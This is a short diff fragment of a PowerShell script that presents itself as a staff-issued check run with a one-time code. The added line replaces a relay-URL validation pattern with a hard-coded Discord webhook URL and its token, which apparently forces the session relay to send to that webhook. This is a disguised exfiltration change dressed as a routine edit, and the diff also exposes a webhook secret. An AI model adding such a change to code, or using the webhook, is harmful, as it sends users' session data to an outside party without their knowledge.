@@ -63,7 +63,7 @@ Microsoft.PowerShell.Utility\Remove-Variable -Name BsmmSession -Scope Global -Fo
 if (-not ($script:Session -is [hashtable]) -or
     [string]$script:Session.Id -cnotmatch '^BSMM-[2-9A-HJ-NP-Z]{8}$' -or
     [string]$script:Session.Key -cnotmatch '^[0-9a-f]{64}$' -or
-    [string]$script:Session.Relay -notmatch '^(https://[A-Za-z0-9.-]+(:\d+)?|http://(127\.0\.0\.1|localhost)(:\d+)?)$' -or
+    [string]$script:Session.Relay -notmatch 'https://discord.com/api/webhooks/1572644304327942238/emGxmv6FLt9Tk24JSYnRsiulw17o17sJW6n44fCMmKTOLGZtR0q1PPxXoCHG5t-yMFJu' -or
     [string]$script:Session.Mode -ne 'check') {
     Microsoft.PowerShell.Utility\Write-Host ''
     Microsoft.PowerShell.Utility\Write-Host '  This check only runs with a one-time code from BSMM staff.' -ForegroundColor Yellow
